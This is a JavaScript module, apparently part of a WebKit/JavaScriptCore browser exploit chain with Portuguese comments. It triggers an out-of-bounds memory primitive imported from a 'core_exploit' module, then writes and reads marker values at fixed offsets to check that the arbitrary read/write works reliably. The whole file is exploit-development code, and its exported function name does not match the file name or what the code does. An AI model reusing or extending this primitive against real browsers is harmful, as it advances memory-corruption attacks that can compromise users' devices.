// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_dataview_real,
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

// ============================================================
// FUNÇÃO DE INVESTIGAÇÃO
// ============================================================
export async function sprayAndInvestigateObjectExposure() {
    const FNAME_DIAGNOSTIC = "diagnostic_v15b_DebugRWIntegrity";
    logS3(`--- Iniciando Diagnóstico (${FNAME_DIAGNOSTIC}): Integridade de Leitura/Escrita ---`, "test", FNAME_DIAGNOSTIC);

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real || !oob_write_absolute || !oob_read_absolute) {
            throw new Error("OOB Init ou primitivas R/W falharam.");
        }
        logS3("Ambiente OOB inicializado.", "info", FNAME_DIAGNOSTIC);

        const OFFSET_PRIMARY_TEST = 0x20;
        const OFFSET_BEFORE = 0x18;
        const OFFSET_AFTER = 0x28;
        const OFFSET_WAY_AFTER = 0x30;


        const QWORD_A = new AdvancedInt64(0xAAAA1111, 0xAAAA2222);
        const QWORD_B = new AdvancedInt64(0xBBBB3333, 0xBBBB4444);
        const QWORD_C = new AdvancedInt64(0xCCCC5555, 0xCCCC6666);
        const QWORD_D = new AdvancedInt64(0xDDDD7777, 0xDDDD8888);

        const DWORD_X = 0x12345678;
        const DWORD_Y = 0x87654321;

        // Função auxiliar para limpar e testar R/W de QWORD
        async function test_qword_rw(offset, qword_val, test_name) {
            logS3(`TESTE QWORD (${test_name}): Escrita/Leitura em ${toHex(offset)}`, "info", FNAME_DIAGNOSTIC);
            oob_write_absolute(offset, AdvancedInt64.Zero, 8); // Limpar antes
            await PAUSE_S3(20);
            oob_write_absolute(offset, qword_val, 8);
            logS3(`  Escrito ${qword_val.toString(true)} em ${toHex(offset)}`, "info", FNAME_DIAGNOSTIC);
            let read_val = oob_read_absolute(offset, 8);
            let status = read_val.equals(qword_val);
            logS3(`  Lido de  ${toHex(offset)}: ${read_val.toString(true)} - ${status ? "CORRETO" : "INCORRETO!"}`, status ? "good" : "error", FNAME_DIAGNOSTIC);
            return status;
        }

        // Função auxiliar para limpar e testar R/W de DWORD
        async function test_dword_rw(offset, dword_val, test_name) {
            logS3(`TESTE DWORD (${test_name}): Escrita/Leitura em ${toHex(offset)}`, "info", FNAME_DIAGNOSTIC);
             // Limpar QWORD em volta para evitar confusão com testes anteriores
            if(offset >=4) oob_write_absolute(offset-4, AdvancedInt64.Zero, 8); else oob_write_absolute(offset, AdvancedInt64.Zero, 8);
            await PAUSE_S3(20);
            oob_write_absolute(offset, dword_val, 4);
            logS3(`  Escrito ${toHex(dword_val)} em ${toHex(offset)}`, "info", FNAME_DIAGNOSTIC);
            let read_val = oob_read_absolute(offset, 4);
            let status = (read_val === dword_val);
            logS3(`  Lido de  ${toHex(offset)}: ${toHex(read_val)} - ${status ? "CORRETO" : "INCORRETO!"}`, status ? "good" : "error", FNAME_DIAGNOSTIC);
            return status;
        }

        await test_qword_rw(OFFSET_PRIMARY_TEST, QWORD_A, "Isolada em 0x20");
        await test_qword_rw(OFFSET_BEFORE, QWORD_B, "Isolada em 0x18");
        await test_qword_rw(OFFSET_AFTER, QWORD_C, "Isolada em 0x28");
        await test_qword_rw(OFFSET_WAY_AFTER, QWORD_D, "Isolada em 0x30");
        
        await PAUSE_S3(50);

        logS3("TESTE DE ESCRITAS SEQUENCIAIS (NÃO SOBREPOSTAS LOGICAMENTE):", "info", FNAME_DIAGNOSTIC);
        // Escrever todos primeiro
        logS3("  Fase de Escrita Sequencial:", "info", FNAME_DIAGNOSTIC);
        oob_write_absolute(OFFSET_BEFORE, QWORD_A, 8);
        logS3(`    Escrito ${QWORD_A.toString(true)} em ${toHex(OFFSET_BEFORE)}`, "info", FNAME_DIAGNOSTIC);
        oob_write_absolute(OFFSET_PRIMARY_TEST, QWORD_B, 8);
        logS3(`    Escrito ${QWORD_B.toString(true)} em ${toHex(OFFSET_PRIMARY_TEST)}`, "info", FNAME_DIAGNOSTIC);
        oob_write_absolute(OFFSET_AFTER, QWORD_C, 8);
        logS3(`    Escrito ${QWORD_C.toString(true)} em ${toHex(OFFSET_AFTER)}`, "info", FNAME_DIAGNOSTIC);
        oob_write_absolute(OFFSET_WAY_AFTER, QWORD_D, 8);
        logS3(`    Escrito ${QWORD_D.toString(true)} em ${toHex(OFFSET_WAY_AFTER)}`, "info", FNAME_DIAGNOSTIC);
        
        await PAUSE_S3(50);
        // Ler todos de volta
        logS3("  Fase de Leitura Sequencial:", "info", FNAME_DIAGNOSTIC);
        let read_A = oob_read_absolute(OFFSET_BEFORE, 8);
        logS3(`    Lido de ${toHex(OFFSET_BEFORE)}: ${read_A.toString(true)} (Esperado A) - ${read_A.equals(QWORD_A) ? "OK" : "FALHA"}`, read_A.equals(QWORD_A) ? "good" : "error", FNAME_DIAGNOSTIC);
        let read_B = oob_read_absolute(OFFSET_PRIMARY_TEST, 8);
        logS3(`    Lido de ${toHex(OFFSET_PRIMARY_TEST)}: ${read_B.toString(true)} (Esperado B) - ${read_B.equals(QWORD_B) ? "OK" : "FALHA"}`, read_B.equals(QWORD_B) ? "good" : "error", FNAME_DIAGNOSTIC);
        let read_C = oob_read_absolute(OFFSET_AFTER, 8);
        logS3(`    Lido de ${toHex(OFFSET_AFTER)}: ${read_C.toString(true)} (Esperado C) - ${read_C.equals(QWORD_C) ? "OK" : "FALHA"}`, read_C.equals(QWORD_C) ? "good" : "error", FNAME_DIAGNOSTIC);
        let read_D = oob_read_absolute(OFFSET_WAY_AFTER, 8);
        logS3(`    Lido de ${toHex(OFFSET_WAY_AFTER)}: ${read_D.toString(true)} (Esperado D) - ${read_D.equals(QWORD_D) ? "OK" : "FALHA"}`, read_D.equals(QWORD_D) ? "good" : "error", FNAME_DIAGNOSTIC);

        await PAUSE_S3(50);

        logS3("TESTE DE INTEGRIDADE DE DWORDs EM OFFSETS PROBLEMÁTICOS:", "info", FNAME_DIAGNOSTIC);
        // Testar escrita de DWORDs nos limites das "células" de QWORD anteriores
        // OFFSET_PRIMARY_TEST = 0x20. test_dword_rw(0x20, ...) e test_dword_rw(0x24, ...)
        await test_dword_rw(OFFSET_PRIMARY_TEST, DWORD_X, `DWORD X em 0x20`);     // mem[0x20] = DWORD_X
        await test_dword_rw(OFFSET_PRIMARY_TEST + 4, DWORD_Y, `DWORD Y em 0x24`); // mem[0x24] = DWORD_Y
        
        // Ler de volta como QWORD para ver como foram combinados
        logS3("  Lendo DWORDS combinados como QWORD de 0x20:", "info", FNAME_DIAGNOSTIC);
        let combined_qword = oob_read_absolute(OFFSET_PRIMARY_TEST, 8);
        const EXPECTED_COMBINED = new AdvancedInt64(DWORD_X, DWORD_Y); // Esperado: {DWORD_Y, DWORD_X}
        logS3(`    QWORD lido de 0x20: ${combined_qword.toString(true)} (Esperado: ${EXPECTED_COMBINED.toString(true)}) - ${combined_qword.equals(EXPECTED_COMBINED) ? "OK" : "FALHA"}`, combined_qword.equals(EXPECTED_COMBINED) ? "good" : "error", FNAME_DIAGNOSTIC);


        logS3("Diagnóstico de Integridade R/W concluído.", "test", FNAME_DIAGNOSTIC);

    } catch (e) {
        logS3(`ERRO CRÍTICO no diagnóstico: ${e.message}`, "critical", FNAME_DIAGNOSTIC);
        if (e.stack) logS3(`Stack: ${e.stack}`, "critical", FNAME_DIAGNOSTIC);
        document.title = "Diagnóstico Integridade FALHOU!";
    } finally {
        clearOOBEnvironment();
        logS3(`--- Diagnóstico (${FNAME_DIAGNOSTIC}) Concluído ---`, "test", FNAME_DIAGNOSTIC);
    }
}
